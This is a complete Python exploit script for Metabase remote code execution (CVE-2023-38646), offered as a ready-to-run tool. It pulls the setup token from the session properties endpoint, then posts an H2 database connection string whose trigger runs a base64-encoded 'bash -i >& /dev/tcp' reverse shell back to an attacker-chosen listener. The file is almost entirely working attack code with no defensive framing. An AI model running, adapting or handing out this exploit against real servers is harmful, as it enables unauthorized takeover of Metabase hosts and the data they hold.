import sys, time, signal, re, random, base64, re
import requests
import pdb
from pwn import *
from string import ascii_uppercase
from colorama import Fore, Style
import argparse

def def_handler(sig, frame):
    print("\n\n[!] Quitting..\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

def parse_arguments():
    parser = argparse.ArgumentParser(description="Metabase Reverse Shell")

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-lhost", "--local_host", required=True, help="Listen IP")
    parser.add_argument("-lport", "--local_port", required=True, help="Listen Port")

    return parser.parse_args()

# Variables
args = parse_arguments()
endpoint_get = '/api/session/properties'
endpoint_post = '/api/setup/validate'
headers = {
    "Content-Type": "application/json",
    "Connection": "close"
}
# Parameters
main_url = args.url
laddress = args.local_host
lport = args.local_port



def b64(payload: str) -> str:
    encoded_payload = base64.b64encode(payload.encode('ascii')).decode()
    equals_count = encoded_payload.count('=')

    if equals_count >= 1:
        encoded_payload = base64.b64encode(f'{payload + " " * equals_count}'.encode('ascii')).decode()

    return encoded_payload

shell_code = b64(f'bash -i >& /dev/tcp/{laddress}/{lport} 0>&1')

def attack():
    r = requests.get(main_url + endpoint_get)
    print("[+] Extracting {setup-token}..")
    setup_token = re.findall(r'"setup-token":"(.*?)"', r.text)[0]
    url = f'{main_url}{endpoint_post}'

    payload = {
        "token": setup_token,
        "details": {
            "details": {
                "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_string} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{shell_code}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x".format(random_string=''.join(random.choice(ascii_uppercase) for i in range(12)), shell_code=shell_code),
                "advanced-options": False,
                "ssl": True
            },
            "name": "x",
            "engine": "h2"
        }
    }
    time.sleep(1)
    print("[+] Injecting payload..")
    request = requests.post(url, json=payload, headers=headers)


if __name__ == '__main__':
    print(Fore.GREEN + Style.BRIGHT + """
          -----------------------------------
          |  MetaBase - CVE-2023-38646 RCE  |
          -----------------------------------
          """ + Style.RESET_ALL)
    print(Fore.RED + Style.BRIGHT + "[!] Do not forget to start listening mode on the host:lport before run the script!\n" + Style.RESET_ALL)
    attack()
    print("[+] Payload sent")
    time.sleep(2)
